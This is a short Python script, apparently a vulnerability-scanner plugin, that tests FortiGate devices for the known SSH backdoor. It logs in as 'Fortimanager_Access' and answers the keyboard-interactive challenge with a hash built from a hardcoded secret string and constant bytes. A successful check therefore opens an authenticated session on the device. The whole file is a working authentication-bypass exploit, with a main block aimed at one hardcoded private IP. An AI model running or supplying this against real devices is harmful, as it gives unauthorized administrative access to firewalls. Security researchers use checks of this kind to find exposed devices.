# -*- coding:utf-8 -*-

import paramiko
import base64
import hashlib
from time import time

def custom_handler(title, instructions, prompt_list):
    n = prompt_list[0][0]
    m = hashlib.sha1()
    m.update('\x00' * 12)
    m.update(n + 'FGTAbc11*xy+Qqz27')
    m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
    h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
    return [h]

def verify(protocol,ip,port):
    host = ip
    url = ip+':'+str(port)
    print('testing if fortigate vul')
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host,username='',allow_agent=False,look_for_keys=False)
    #except paramiko.ssh_exception.AuthenticationException,e:
    except Exception as e:
        msg = 'Ther is no fortigate backdoor in this host:'+url+'.'
        number = 'v0'
        return False,url,number,msg
    #else:
        #msg = 'Ther is no fortigate backdoor in this host:'+url+'.'
        #return False,url,msg

    trans = client.get_transport()
    try:
        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
    except Exception as e:
        pass
    else:
        msg = 'Ther is no fortigate backdoor in this host:'+url+'.'
        number = 'v0'
        return False, url,number,msg

    try:
        trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)
        msg = 'Ther is fortigate backdoor in this host:'+url+'.'
        number = 'v2'
        print(msg)
        return True, url,number,msg
    except Exception as e:
        msg = 'Ther is no fortigate backdoor in this host:'+url+'.'
        number = 'v0'
        return False, url,number,msg


if __name__ == '__main__':
    #ip = sys.argv[1]
    #port = sys.argv[2]
    #protocol = sys.argv[3]
    ips=[('10.41.213.133','80','http')]
    for ip,port,protocol in ips:
        ts = time()        
        result = verify(ip,port,protocol)
        print('扫描结果: {}'.format(result))
        print('用时 {}s'.format(time() - ts))